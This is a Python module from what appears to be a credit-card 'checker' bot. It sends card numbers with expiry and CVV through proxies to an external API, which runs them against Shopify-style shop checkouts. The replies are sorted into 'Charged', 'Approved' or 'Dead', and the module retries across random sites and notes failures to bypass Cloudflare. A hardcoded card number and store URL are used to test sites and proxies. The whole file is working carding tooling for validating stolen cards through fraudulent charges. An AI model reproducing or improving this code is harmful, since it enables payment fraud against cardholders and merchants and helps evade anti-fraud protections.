import asyncio
import random

import aiohttp

from config import CHECKER_API_URL
from utils.helpers import is_dead_site_error


# ─── Card Checking ────────────────────────────────────────────────────────────

async def check_card(card: str, site: str, proxy: str) -> dict:
    """Check a single card against a site using the checker API.

    Returns a result dict with keys:
        status   : 'Charged' | 'Approved' | 'Dead' | 'Site Error' | 'Invalid Format'
        message  : raw API response string
        card     : the card string that was checked
        site     : the site used (when available)
        gateway  : gateway name from API
        price    : price from API
        retry    : True if caller should retry with a different site
    """
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return {
                "status": "Invalid Format",
                "message": "Invalid card format",
                "card": card,
            }

        params = {"cc": card, "url": site, "proxy": proxy}
        timeout = aiohttp.ClientTimeout(total=120)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get("Response", "")
        price = raw.get("Price", "-")
        gate = raw.get("Gate", "shopiii")
        status = raw.get("Status", "")

        if is_dead_site_error(response_msg):
            return {
                "status": "Site Error",
                "message": response_msg,
                "card": card,
                "retry": True,
                "gateway": gate,
                "price": price,
            }

        response_lower = response_msg.lower()

        if status == "Charged" or "order completed" in response_lower or "💎" in response_msg:
            return {
                "status": "Charged",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gate,
                "price": price,
            }

        if "cloudflare bypass failed" in response_lower:
            return {
                "status": "Site Error",
                "message": "Cloudflare spotted",
                "card": card,
                "retry": True,
                "gateway": gate,
                "price": price,
            }

        if "thank you" in response_lower or "payment successful" in response_lower:
            return {
                "status": "Charged",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gate,
                "price": price,
            }

        _approved_keywords = (
            "approved", "success",
            "insufficient_funds", "insufficient funds",
            "invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc",
            "invalid cvv", "incorrect cvv", "invalid cvc", "incorrect cvc",
            "incorrect_zip", "incorrect zip",
        )

        if status == "Approved" or any(k in response_lower for k in _approved_keywords):
            return {
                "status": "Approved",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gate,
                "price": price,
            }

        return {
            "status": "Dead",
            "message": response_msg,
            "card": card,
            "site": site,
            "gateway": gate,
            "price": price,
        }

    except asyncio.TimeoutError:
        return {
            "status": "Site Error",
            "message": "Request timeout",
            "card": card,
            "retry": True,
        }

    except Exception as exc:
        error_msg = str(exc)
        if is_dead_site_error(error_msg):
            return {
                "status": "Site Error",
                "message": error_msg,
                "card": card,
                "retry": True,
            }
        return {
            "status": "Dead",
            "message": error_msg,
            "card": card,
            "gateway": "Unknown",
            "price": "-",
        }


async def check_card_with_retry(
    card: str,
    sites: list[str],
    proxy: str,
    max_retries: int = 2,
) -> dict:
    """Attempt to check a card, retrying with a different site on site errors.

    Args:
        card        : card string in ``number|mm|yyyy|cvv`` format
        sites       : list of site URLs to randomly choose from
        proxy       : proxy string in ``ip:port:user:pass`` format
        max_retries : maximum number of site attempts before giving up

    Returns a result dict (see :func:`check_card`).
    """
    if not sites:
        return {
            "status": "Dead",
            "message": "No sites available",
            "card": card,
            "gateway": "Unknown",
            "price": "-",
        }

    if not proxy:
        return {
            "status": "Dead",
            "message": "No proxy configured",
            "card": card,
            "gateway": "Unknown",
            "price": "-",
        }

    last_result = None

    for attempt in range(max_retries):
        site = random.choice(sites)
        result = await check_card(card, site, proxy)

        if not result.get("retry"):
            return result

        last_result = result

        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {
            "status": "Dead",
            "message": f"Site errors: {last_result['message']}",
            "card": card,
            "gateway": last_result.get("gateway", "Unknown"),
            "price": last_result.get("price", "-"),
            "site": "Multiple",
        }

    return {
        "status": "Dead",
        "message": "Max retries exceeded",
        "card": card,
        "gateway": "Unknown",
        "price": "-",
    }


# ─── Site / Proxy Testing ─────────────────────────────────────────────────────

_TEST_CARD = "5154623245618097|03|2032|156"
_TEST_SITE = "https://riverbendhomedev.myshopify.com"


async def test_site(site: str, proxy: str) -> dict:
    """Test whether a site is alive by running a dummy card through the API.

    Returns ``{'site': site, 'status': 'alive' | 'dead'}``.
    """
    try:
        params = {"cc": _TEST_CARD, "url": site, "proxy": proxy}
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get("Response", "").lower()

        if is_dead_site_error(response_msg):
            return {"site": site, "status": "dead"}

        return {"site": site, "status": "alive"}

    except Exception:
        return {"site": site, "status": "dead"}


async def test_proxy(proxy: str) -> dict:
    """Test whether a proxy is alive by running a dummy request through the API.

    Returns ``{'proxy': proxy, 'status': 'alive' | 'dead'}``.
    """
    try:
        params = {"cc": _TEST_CARD, "url": _TEST_SITE, "proxy": proxy}
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get("Response", "").lower()

        _dead_proxy_phrases = ("proxy dead", "invalid proxy format", "no proxy")
        if any(phrase in response_msg for phrase in _dead_proxy_phrases):
            return {"proxy": proxy, "status": "dead"}

        return {"proxy": proxy, "status": "alive"}

    except Exception:
        return {"proxy": proxy, "status": "dead"}
